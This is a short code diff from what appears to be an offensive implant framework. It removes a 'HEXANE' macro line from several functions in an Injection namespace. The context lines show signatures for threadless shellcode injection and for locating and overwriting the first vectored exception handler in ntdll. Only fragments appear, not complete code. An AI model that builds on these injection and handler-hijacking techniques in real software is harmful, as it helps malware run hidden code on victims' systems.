@@ -5,7 +5,6 @@
 namespace Injection {
 
     VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
-        HEXANE
 
         HANDLE      process     = { };
         UINT_PTR    loader_rva  = 0;
@@ -59,7 +58,6 @@ namespace Injection {
     namespace Veh {
 
         UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
-            HEXANE
 
             LdrpVectorHandlerList   *handlers   = { };
             uintptr_t               handler     = { };
@@ -80,7 +78,6 @@ namespace Injection {
         }
 
         UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode) {
-            HEXANE
 
             const auto  cookie  = Memory::Methods::GetStackCookie();
             uintptr_t   encoded = 0;
@@ -95,7 +92,6 @@ namespace Injection {
         }
 
         NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
-            HEXANE
 
             const auto mod_hash = Utils::GetHashFromStringW(writer.mod_name, x_wcslen(writer.mod_name));
             const auto ntdll    = Memory::Modules::GetModuleEntry(mod_hash);
